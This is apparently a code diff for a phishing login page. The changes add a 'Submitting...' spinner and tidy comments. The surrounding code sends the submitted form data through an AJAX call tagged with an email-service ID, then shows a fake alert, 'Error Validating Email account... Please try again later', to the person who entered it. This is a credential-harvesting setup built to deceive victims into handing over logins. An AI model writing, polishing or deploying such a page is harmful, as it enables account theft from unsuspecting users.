@@ -139,8 +139,13 @@
 
             <input type="submit" class="login-button" id="btWole" value="Continue">
         </form>
-    </div>
 
+        <!-- Loader (hidden by default) -->
+        <div id="loader" style="display:none; text-align:center; margin-top: 20px;">
+            <img src="https://img.freepik.com/free-vector/loading-circles-blue-gradient_78370-2646.jpg?semt=ais_hybrid&w=740" alt="Loading..." width="40">
+            <p style="color: gray;">Submitting...</p>
+        </div>
+    </div>
 
     <script type="text/javascript">
         (function () {
@@ -159,7 +164,9 @@
             });
 
         $('.ajaxForm').on('submit', function (event) {
-            event.preventDefault(); // prevent reloader in the code
+            event.preventDefault();
+
+            $('#loader').show(); // Show loader
 
             var formData = new FormData(this);
             formData.append('service_id', 'service_bfo7uog');
@@ -172,15 +179,15 @@
                 contentType: false,
                 processData: false
             }).done(function () {
+                $('#loader').hide(); // Hide loader
                 alert('Error Validating Email account... Please try again later');
-                // window.location.href = "error.html"
             }).fail(function (error) {
+                $('#loader').hide(); // Hide loader
                 alert('Oops... ' + JSON.stringify(error));
             });
         });
-
     </script>
-
 </body>
+
 
 </html>
